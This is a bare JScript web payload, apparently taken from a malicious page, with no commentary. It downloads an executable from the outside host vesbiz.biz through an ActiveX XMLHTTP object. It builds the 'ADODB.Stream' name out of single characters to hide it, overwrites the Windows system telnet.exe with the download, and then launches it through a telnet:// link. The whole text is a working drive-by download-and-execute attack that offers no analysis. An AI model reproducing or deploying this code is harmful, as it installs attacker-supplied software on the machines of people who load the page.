var downloadurl="http://www.vesbiz.biz/d/msits.exe";

if(navigator.appVersion.indexOf("Windows NT 5.1")!=-1) savetopath="C:\\WINDOWS\\system32\\telnet.exe";
if(navigator.appVersion.indexOf("Windows NT 5.0")!=-1) savetopath="C:\\WINNT\\system32\\telnet.exe";

payloadURL = downloadurl;
var x = new ActiveXObject("Microsoft.XMLHTTP");
x.Open("GET",payloadURL,0);
x.Send();

function bla() { return "A" + "D" + "O" + "D" + "B" + "." + "S" + "t" + "r" + "e" + "a" + "m"; }

var s = new ActiveXObject(bla());
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);
s.SaveToFile(savetopath,2);

location.href = "telnet://";
